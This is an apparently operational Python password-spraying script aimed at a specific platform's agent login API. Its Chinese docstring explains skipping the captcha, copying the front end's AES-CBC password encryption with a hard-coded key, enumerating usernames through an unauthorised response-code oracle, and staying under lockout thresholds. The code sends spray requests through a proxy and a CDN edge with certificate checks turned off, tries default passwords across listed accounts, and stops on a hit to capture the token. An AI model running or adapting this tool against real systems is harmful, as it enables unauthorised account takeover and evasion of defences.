#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通用手法：**密码喷洒 > 单账号字典** —— 面向「批量生成的运营账号」。
   前提（先验证，全部要实测）：
     1) 登录接口不需要验证码（本目标：不带 validateType 即跳过验证码；带 validateType:0 才要图形码）
     2) 口令在前端加密 → 必须按前端算法构造密文（本目标 AES-CBC/Pkcs7, key=iv=pigxpigxpigxpigx, base64）
     3) 用户名清单来自存在性 oracle（本目标：未授权 appSave 返回 11501 即存在）
   为什么喷洒而不是字典：
     · 批量开的运营号通常共用同一个默认口令 → 一个口令打全部账号，命中即全军
     · 每个账号每轮只试 1 次，请求量摊到最低，比单账号连打 50 次安全得多（本目标单账号连打 96 次、喷洒 44 次均未触发封禁）
   口令候选顺序（按运营习惯）：123456 / a123456 / aa123456 / abc123456 / 666666 / 888888 /
     批量号前缀+123456 / 平台主域名 / 运营方昵称 / 已知关联密码
   关键实现细节：
     · 命中即停，并把 access_token 落库（本目标 token_type=Bearer，**后续请求必须带 `Bearer ` 前缀**）
     · 有些站「单账号单会话」：新登录会顶掉旧 token（本目标返回 16003「账号已在其它设备登录」）→ 客户端要能自动重登
     · 记录「已禁用」类错误码（本目标 11211 当前账号已被禁用）→ 这些账号不再花预算
"""
import base64
import json
import socket
import ssl
import sys
import time

PROXY = ('127.0.0.1', 7892)      # 我方出口；直连改 None
EDGE = '203.0.113.50'          # CDN 边缘（源站被黑洞时用边缘 + 正确 Host/SNI）
HOST = 'example.com'
PORT = 443
PATH = '/agent/agent/api/v1/agentPlate/login'
KEY = b'pigxpigxpigxpigx'
HDRS = {'Accept': 'application/vnd.dysaas.v1+json', 'Content-Type': 'application/json',
        'clientCode': 'ffty', 'clientItem': 'ffty', 'language': 'zh-cn', 'device': '1', 'pc': '1',
        'merchantCode': '1', 'skinCode': 'a041', 'appid': 'a041'}
UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/203.0.113.30 Safari/537.36')
RATE = 1.5
DISABLED_CODE = 11211
WRONG_CODE = 13091


def enc(pt):
    """AES-CBC + PKCS7, key=iv=pigx..., base64 —— 必须与前端 encrypt() 一致，否则服务端解密抛异常(500/1012)"""
    d = pt.encode()
    n = 16 - len(d) % 16
    d += bytes([n]) * n
    try:
        from Crypto.Cipher import AES
    except Exception:
        from Cryptodome.Cipher import AES
    return base64.b64encode(AES.new(KEY, AES.MODE_CBC, KEY).encrypt(d)).decode()


def post(path, body, host=HOST, ip=EDGE, port=PORT, t=20):
    h = dict(HDRS)
    h.update({'Host': host, 'User-Agent': UA, 'Connection': 'close',
              'Content-Length': str(len(body))})
    req = ('POST %s HTTP/1.1\r\n' % path + '\r\n'.join('%s: %s' % i for i in h.items())
           + '\r\n\r\n').encode() + body
    if PROXY:
        c = socket.create_connection(PROXY, timeout=t)
        c.sendall(('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (ip, port, ip, port)).encode())
        if b' 200' not in c.recv(200).split(b'\r\n')[0]:
            raise OSError('proxy CONNECT failed')
    else:
        c = socket.create_connection((ip, port), timeout=t)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(c, server_hostname=host)
    s.sendall(req)
    buf = b''
    s.settimeout(t)
    try:
        while len(buf) < 100000:
            d = s.recv(8192)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    s.close()
    return buf.decode('utf-8', 'ignore')


def spray(accounts, passwords):
    found = []
    for pw in passwords:
        print('=== round pw=%s ===' % pw)
        for a in accounts:
            body = json.dumps({'param': {'name': a, 'password': enc(pw)}}).encode()
            try:
                txt = post(PATH, body)
                code = json.loads(txt.split('\r\n\r\n', 1)[-1] if '\r\n\r\n' in txt else txt).get('code')
            except Exception as e:
                print('  %-12s ERR %s' % (a, e)); time.sleep(RATE); continue
            print('  %-12s %-14s code=%s' % (a, pw, code))
            if code == 0:
                found.append({'account': a, 'password': pw, 'resp': txt})
                print('  !!! HIT %s / %s' % (a, pw))
                return found
            if code == DISABLED_CODE:
                print('      (已禁用，后续跳过)')
            time.sleep(RATE)
    return found


if __name__ == '__main__':
    ACCOUNTS = ['6t001', '6t002', '6t003', '6t004', '6t005', '6t006', '6t007', '6t008',
                '6t009', '6t010', '6t011', '6t012', '6t123', '6t666', '6t777', '6t888',
                '6t999', 'a001', 'agent001', 'admin', '26sjb6t28']
    PWS = ['123456', 'a123456', 'aa123456', 'abc123456', '666666', '888888',
           '6t123456', '6t888888', 'admin123', 'xinron', 'nanyangbw', 'fftya041', 'tgt9783']
    hit = spray([a for a in ACCOUNTS if a not in ('6t999',)], PWS)
    print(json.dumps(hit, ensure_ascii=False, indent=1))
